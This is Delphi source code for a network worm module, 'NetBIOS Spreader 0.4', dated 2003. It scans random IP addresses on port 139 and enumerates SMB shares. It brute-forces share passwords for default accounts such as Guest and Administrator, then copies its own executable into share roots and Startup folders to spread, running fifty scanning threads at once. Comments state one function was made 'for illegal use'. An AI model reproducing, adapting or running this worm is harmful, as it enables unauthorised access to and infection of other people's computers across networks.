   {***********************************************************************}
   {  NetBIOS Spreader 0.4 by Positron                                     }
   {  URL: http://www.virustrading.com/positron                            }
   {                                                                       }
   {  Tested on Windows XP. Write me if you find any error in the code!    }
   {                                                                       }
   {  If you use this source then you must credit Positron. You can freely }
   {  use this source in NON-Commercial applications.                      }
   {                                                                       }
   {  Thanks goes to r-22                                                  }
   {                                                                       }
   {  Notice:                                                              }
   {    You can use ACLUnits and KOL System replacement units if you want  }
   {    to make its compiled size smaller.                                 }
   {***********************************************************************}
   {  History:                                                             }
   {     08/08/2003 - First public version (v0.3)                          }
   {     10/09/2003 - Some optimalisations (v0.4)                          }
   {***********************************************************************}

   UNIT NetBIOS;

   INTERFACE

   PROCEDURE StartNetBIOS;

   IMPLEMENTATION

   USES
     Windows, WinSock, WinInet;

   VAR
     ls,cr:string;
     i,j:integer;
     abc:String;AA:INTEGER;
     min,max:integer;
     last,first:String;
     str0:string;
     no,nc,ns:string;
     lpNetApiBufferFree  : FUNCTION(VAR Buffer) : DWORD;STDCALL;
     lpNetRemoteTOD      : FUNCTION(UNCServerName:pChar;BufferPtr:pByte) : DWORD;STDCALL;
     lpNetScheduleJobAdd : FUNCTION(ServerName:pChar;Buffer:pByte;VAR JobID:DWORD) : DWORD;STDCALL;
     OLD_NetShareEnum    : FUNCTION(pszServer:pChar;sLevel:SmallInt;VAR Bufptr;cbBuffer:Cardinal;VAR pcEntriesRead,pcTotalAvail:Cardinal) : DWORD; STDCALL;
     NT_NetShareEnum     : FUNCTION(ServerName:pWideChar;Level:DWORD;VAR Bufptr;Prefmaxlen:DWORD;VAR EntriesRead,TotalEntries,resume_handle:DWORD) : DWORD; STDCALL;

   CONST
     PREVIOUS_IP              = '2';
     NEXT_IP                  = '1';
     NERR_SUCCESS             = 0;
     MAX_NB_THREAD            = 50;
     MAX_USERNAME             = 4;
     ERROR_ACCESS_DENIED      = 5;
     STYPE_PRINTQ             = 1;
     ERROR_INVALID_PASSWORD   = 86;
     MAX_PASSWORD             = 101;
     ERROR_NO_NET_OR_BAD_PATH = 1203;
     ERROR_LOGON_FAILURE      = 1326;
     lpszUserName  : ARRAY [0..MAX_USERNAME] OF STRING = (
           '','Guest','Administrator','Owner','Root');

   //------------------------------------------------------------------------------
   FUNCTION ExtractFileName(CONST FileName:ShortString) : ShortString;
   VAR
     I : Integer;
   BEGIN
     I:=Length(FileName);
     WHILE (I>=1)AND NOT(FileName[I] IN ['\',':']) DO Dec(I);
     Result:=Copy(FileName,I+1,255);
     IF Result[0]>#0 THEN IF Result[Ord(Result[0])]=#0 THEN Dec(Result[0]);
   END;

   //------------------------------------------------------------------------------
   FUNCTION DirectoryExists(CONST Dir:STRING) : BOOL;
   VAR
     Attr : DWORD;
   BEGIN
     Attr:=GetFileAttributes(pChar(Dir));
     Result:=(Attr<>$FFFFFFFF)AND(Attr AND FILE_ATTRIBUTE_DIRECTORY=FILE_ATTRIBUTE_DIRECTORY);
   END;

   //------------------------------------------------------------------------------
   FUNCTION IsNTBasedOS : BOOL;
   VAR
     verInfo : TOSVersionInfo;
   BEGIN
     Result:=False;
     verInfo.dwOSVersionInfoSize:=SizeOf(TOSVersionInfo);
     GetVersionEx(verInfo);
     IF verInfo.dwPlatformId=VER_PLATFORM_WIN32_NT THEN Result:=True;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE NetRemoteExecute(szServer,szLocation:STRING);
   TYPE
     PTIME_OF_DAY_INFO = ^TTIME_OF_DAY_INFO;
     TTIME_OF_DAY_INFO = RECORD
       tod_elapsedt    : DWORD;
       tod_msecs       : DWORD;
       tod_hours       : DWORD;
       tod_mins        : DWORD;
       tod_secs        : DWORD;
       tod_hunds       : DWORD;
       tod_timezone    : LongInt;
       tod_tinterval   : DWORD;
       tod_day         : DWORD;
       tod_month       : DWORD;
       tod_year        : DWORD;
       tod_weekday     : DWORD;
     END;
     AT_INFO           = RECORD
       JobTime         : DWORD;
       DaysOfMonth     : DWORD;
       DaysOfWeek      : UCHAR;
       Flags           : UCHAR;
       Command         : pWideChar;
     END;
   VAR
     dwRemoteTime : DWORD;
     dwReturn     : DWORD;
     NetAT        : AT_INFO;
     wcCmd        : PWideChar;
     wcServer     : PWideChar;
     lpNetTOD     : PTIME_OF_DAY_INFO;
   BEGIN
     GetMem(wcCmd,1024+1);
     GetMem(wcServer,256+1);
     lpNetTOD:=NIL;
     {$IFDEF Debug}
       WriteLN('[EXECUTE] ADDRESS: '+szServer+' Location: '+szLocation);
     {$ENDIF}
     StringToWideChar(szServer,wcServer,SizeOf(wcServer)+1);
     StringToWideChar(szLocation,wcCmd,SizeOf(wcCmd)+1);
     dwReturn:=lpNetRemoteTOD(pChar(wcServer),@lpNetTOD);
     IF dwReturn=NERR_Success THEN BEGIN
       //* add 2 minutes to current time
       dwRemoteTime:=(lpNetTOD.tod_hours*3600+lpNetTOD.tod_mins*60+lpNetTOD.tod_secs)*1000+lpNetTOD.tod_hunds*10;
       IF lpNetTOD.tod_timezone<>-1 THEN dwRemoteTime:=dwRemoteTime-lpNetTOD.tod_timezone*60000;
       dwRemoteTime:=dwRemoteTime+(2*60)*1000;                                     //* add two minutes to current remote time
       IF IsNTBasedOS THEN lpNetApiBufferFree(lpNetTOD);
       FillChar(NetAT,0,SizeOf(NetAT));
       NetAT.JobTime:=dwRemoteTime;
       NetAT.Command:=@wcCmd;
     END;
     FreeMem(wcCmd);
     FreeMem(wcServer);
   END;

   //------------------------------------------------------------------------------
   //--------------BRUTE FORCE FUNCTION MADE BY SIC FOR ILLEGAL USE----------------
   //------------------------------------------------------------------------------

   Function BRUTE:STRING;
   LABEL AG;
   begin
    j:=0;

    // Set the brute Line.
    ABC:='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789|';

    // Min length of brute
    MIN:=1;
    // Max length
    MAX:=6;

    // Set last character of brute Line
    Last:=ABC[length(abc)];

    // Set first line of brute
    First:=copy(abc,1,1);

    // If "result" is empty of not right length

   if (str0 = '') then str0 := 'a';

    // If not length of STr/Result is MAX then
    If length(str0) <> MAX then begin


     // Check if str < MAX and are LAST+LAST
     if length(str0)>1 then begin
     LS := '';
     For j:=1 to Length(str0) do LS := LS + ABC[length(abc)-1];
     if (str0 = LS) and (length(str0) < MAX) then begin
     AA:=length(str0);
     str0:='';
      For j:=1 to AA do str0 := str0 + first;
      str0:=str0+First;
     end;
    end;
     // This happends when the str aint long enought.
     AG:
      For I:=1 to Length(str0) do begin
       // Scan for Last Char [LAST]
       if Copy(str0,i,1) = last then begin
        // set last char:
        Cr := Copy(abc,pos(Copy(str0,i,1),ABC)+1,1);

        if {(Copy(abc,pos(Copy(Str,i,1),ABC)+1,1) = first) or}
           (Copy(abc,pos(Copy(str0,i,1),ABC)+1,1) = '') or
           (Copy(abc,pos(Copy(str0,i,1),ABC)+1,1) = last) then begin
        // Replace Z with A
        if str0 <> last then begin
        delete(str0,i,1);
        insert(first,str0,i);
        end else begin
        delete(str0,i,1);
        insert(first+first,str0,i);
        exit;
        end;

        // set last char:
        Cr := Copy(abc,pos(Copy(str0,i-1,1),ABC)+1,1);

        // Inc Char infron of Z
        delete(str0,i-1,1);
   (*     if CR <> abc[length(abc)] then
        insert(CR,str,i-1)
        else*)
        // 159000
        INSERT(COPY(ABC,POS(CR,ABC),1) , str0, i-1);
   //     insert(copy(abc,pos(copy(str,length(str),1),abc)+1,1),str,i-1);
       end;
       end;
      End;
        MIN := length(str0);
     if pos('|',str0)=0 then begin

   // HERE OUT BRUTE RESULTS OUT!
      RESULT := str0;
   // OMG OMG OMG OMG, IM NOT CRAZY, MY CAMEL ROLAND SAID THAT.

     end else goto AG;

        Cr := Copy(abc,pos(Copy(str0,length(str0),1),ABC)+1,1);
        delete(str0,length(str0),1);
        insert(CR,str0,i);
        Exit;
      end;

    end;

   //------------------------------------------------------------------------------
   //--------------BRUTE FORCE FUNCTION MADE BY SIC FOR ILLEGAL USE----------------
   //------------------------------------------------------------------------------
   FUNCTION InfectSharedResource(szRemoteName,szRemoteUNC:STRING) : BOOL;
   LABEL
     Next;
   VAR
     I             : DWORD;
     dwRet         : DWORD;
     szLocation    : STRING;
     szFullPath    : STRING;
     bCopy2        : BOOL;
     nK            : Integer;
     nL            : Integer;
     nN            : Integer;
     lpszFileName  : pWideChar;
     NetResource   : TNetResource;
     NetResource2  : TNetResource;
     MaxUserName   : WORD;
     MaxPassword   : WORD;
     str1:string;
   CONST
     PathSize      = 4;
     Path          : ARRAY[1..PathSize] OF STRING =(
                         '\',
                         '\Documents and Settings\All Users\Start Menu\Programs\Startup\',
                         '\WINDOWS\Start Menu\Programs\Startup\',
                         '\WINNT\Profiles\All Users\Start Menu\Programs\Startup\');
   BEGIN
     Result:=False;
     bCopy2:=False;
     szRemoteName:=szRemoteUNC+'\'+szRemoteName;
     NetResource.dwType:=RESOURCETYPE_DISK;
     NetResource.lpLocalName:=NIL;
     NetResource.lpRemoteName:=pChar(szRemoteName);
     NetResource.lpProvider:=NIL;
     lpszFileName:=NIL;
     GetModuleFileName(GetModuleHandle(NIL),pChar(szFullPath),Length(szFullPath));
     lpszFileName:=pWideChar(string(ExtractFilename(szFullPAth)));
     IF IsNTBasedOS THEN BEGIN
       MaxUserName:=MAX_USERNAME;
     END ELSE BEGIN
       MaxUserName:=0;
     END;

     FOR nK:=0 TO MaxUserName DO BEGIN
     str1:= '';
   //    FOR nL:=0 TO MaxPassword DO BEGIN
       WHILE length(STR1) < 7 DO BEGIN
         dwRet:=WNetAddConnection2(NetResource,pChar(STR1),pChar(lpszUserName[nK]),0);

         CASE dwRet OF

           ERROR_NO_NET_OR_BAD_PATH : Exit;

         END;

         IF dwRet=NO_ERROR THEN BEGIN
           FOR I:=1 TO PathSize DO BEGIN
             IF I=1 THEN BEGIN                                                     // Copy file to root dir of shared resource
               IF DirectoryExists(szRemoteName)AND(NOT BCopy2) THEN BEGIN
                 bCopy2:=CopyFile(pChar(ParamStr(0)),pChar(szRemoteName+'\Xi.exe'),False);
                 IF NOT bCopy2 THEN GOTO Next;
                 Result:=True;
                 IF IsNTBasedOS THEN NetRemoteExecute(szRemoteUNC,'Xi.exe');
               END;
             END ELSE BEGIN                                                        // Copy files to startup dirs
               IF DirectoryExists(NetResource.lpRemoteName+Path[I]) THEN BEGIN
                 IF CopyFile(pChar(ParamStr(0)),pChar(szRemoteName+Path[I]+'Setup.exe'),False) THEN BEGIN
                   FOR nN:=0 TO 20 DO IF WnetCancelConnection(NetResource.lpRemoteName,True)=NO_ERROR THEN Exit;
                   Result:=True;
                   Exit;
                 END;
               END;
             END;
           END;
           Next:
           FOR nN:=0 TO 20 DO IF WnetCancelConnection(NetResource.lpRemoteName,True)=NO_ERROR THEN Break;

         END;
       END;

       STR1 := BRUTE;
     END;
   END;

   //------------------------------------------------------------------------------
   FUNCTION EnumShare(szRemoteAddr:STRING) : BOOL;
   TYPE
     Share_INFO_1   = RECORD
       shi1_netname : PWideChar;
       shi1_type    : DWORD;
       shi1_remark  : LPTSTR;
     END;
     LPShare_INFO_1 =^Share_INFO_1;
   VAR
     dwK            : DWORD;
     hResume        : DWORD;
     dwReturn       : DWORD;
     dwReadEntires  : DWORD;
     dwTotalEntires : DWORD;
     szShareName    : STRING;
     wcRemoteAddr   : pWideChar;
     lpShareInfo    : LPSHARE_INFO_1;
     lpCurrentInfo  : LPSHARE_INFO_1;
   BEGIN
     Result:=False;
     GetMem(wcRemoteAddr,MAX_PATH+10);
     StringToWideChar(szRemoteAddr,wcRemoteAddr,MAX_PATH+10);
     hResume:=0;
     REPEAT
       lpShareInfo:=NIL;
       IF IsNTBasedOS THEN dwReturn:=NT_NetShareEnum(wcRemoteAddr,1,lpShareInfo,8192,dwReadEntires,dwTotalEntires,hResume)
        ELSE dwReturn:=OLD_NetShareEnum(pChar(wcRemoteAddr),1,lpShareInfo,8192,dwReadEntires,dwTotalEntires);
       IF(dwReturn<>ERROR_MORE_DATA)AND(dwReturn<>ERROR_SUCCESS) THEN Break;
       lpCurrentInfo:=lpShareInfo;
       FOR dwK:=0 TO dwReadEntires-1 DO BEGIN
         szShareName:=lpCurrentInfo.shi1_netname;
         {$IFDEF Debug}
           WriteLN('[SHARE] Server: '+szRemoteAddr+' Share: '+szShareName);
         {$ENDIF}
         IF lpcurrentinfo.shi1_type<>STYPE_PRINTQ THEN Result:=InfectSharedResource(szShareName,szRemoteAddr);
         Inc(lpCurrentInfo);
       END;
       IF IsNTBasedOS THEN lpNetAPIBufferFree(lpShareInfo);
     UNTIL dwReturn<>ERROR_MORE_DATA;
     FreeMem(wcRemoteAddr);
   END;

   function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   //------------------------------------------------------------------------------
   PROCEDURE GetRandomIP(VAR szIPAddr:STRING;VAR NIPAddrA,NIPAddrB,NIPAddrC,NIPAddrD:WORD);
   BEGIN
     IF szIPAddr='' THEN BEGIN
       nIPAddrA:=Random(254)+1;
       nIPAddrB:=Random(254)+1;
       nIPAddrC:=Random(254)+1;
       nIPAddrD:=Random(254)+1;
     END;
     IF(szIPAddr=NEXT_IP)AND(nIPAddrD<255)THEN Inc(nIPAddrD);
     IF(szIPAddr=PREVIOUS_IP)AND(nIPAddrD>2)THEN Dec(nIPAddrD,2);
     szIPAddr:=IntToStr(nIPAddrA)+'.'+IntToStr(nIPAddrB)+'.'+IntToStr(nIPAddrC)+'.'+IntToStr(nIPAddrD);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE InfectNetBIOS;
   VAR
     szIPAddr      : STRING;
     Sock          : TSocket;
     SockAddr      : TSockAddrIn;
     IPA           : WORD;
     IPB           : WORD;
     IPC           : WORD;
     IPD           : WORD;
     R             : BOOL;
   BEGIN
     R:=False;
     szIPAddr:='';
     WHILE True DO BEGIN
       IF R=True THEN BEGIN
         IF szIPAddr=PREVIOUS_IP THEN szIPAddr:='' ELSE BEGIN
           IF szIPAddr=NEXT_IP THEN szIPAddr:=PREVIOUS_IP;
           IF szIPAddr='' THEN szIPAddr:=NEXT_IP;
         END;
       END ELSE szIPAddr:='';
       GetRandomIP(szIPAddr,IPA,IPB,IPC,IPD);
       {$IFDEF Debug}
       WriteLN('[SCANNING] Addres: '+szIPAddr+' Port: 139');
       {$ENDIF}
       Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
       SockAddr.sin_family:=AF_INET;
       SockAddr.sin_port:=htons(139);
       SockAddr.sin_addr.S_addr:=inet_addr(pChar(szIPAddr));
       IF connect(Sock,SockAddr,SizeOf(SockAddr))<>SOCKET_ERROR THEN BEGIN
         {$IFDEF Debug}
         WriteLn('[SCANNED] Address: '+szIPAddr+' Port: 139 State: Open');
         {$ENDIF}
         CloseSocket(Sock);
         R:=EnumShare('\\'+szIPAddr);
       END ELSE BEGIN
         {$IFDEF Debug}
           WriteLN('[SCANNED] Address: '+szIPAddr+' Port: 139 State: Closed');
         {$ENDIF}
         CloseSocket(Sock);
       END;
       Sleep(512);
     END;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE InitNETAPIFunctions;
   VAR
     NETAPI32 : Thandle;
   BEGIN
     NETAPI32:=LoadLibrary('netapi32.dll');
     lpNetRemoteTOD:=GetProcAddress(NETAPI32,'NetRemoteTOD');
     lpNetScheduleJobAdd:=GetProcAddress(NETAPI32,'NetScheduleJobAdd');
     IF IsNTBasedOS THEN BEGIN
       NT_NetShareEnum:=GetProcAddress(NETAPI32,'NetShareEnum');
       lpNetAPIBufferFree:=GetProcAddress(NETAPI32,'NetApiBufferFree');
     END ELSE OLD_NetShareEnum:=GetProcAddress(NETAPI32,'NetShareEnum');
   END;

   //------------------------------------------------------------------------------
   PROCEDURE StartNetBIOS;
   VAR
     Msg      : TMsg;
     I        : WORD;
     ThreadID : DWORD;
   BEGIN
     WHILE NOT InternetGetConnectedState(NIL,0) DO Sleep(1000);                    //Wait for Internet connection
     Randomize;
     InitNETAPIFunctions;
     FOR I:=0 TO MAX_NB_THREAD DO CreateThread(NIL,0,@InfectNetBios,NIL,I,ThreadID);
     WHILE GetMessage(Msg,0,0,0) DO DispatchMessage(Msg);                          //Make application resident
   END;

   END.
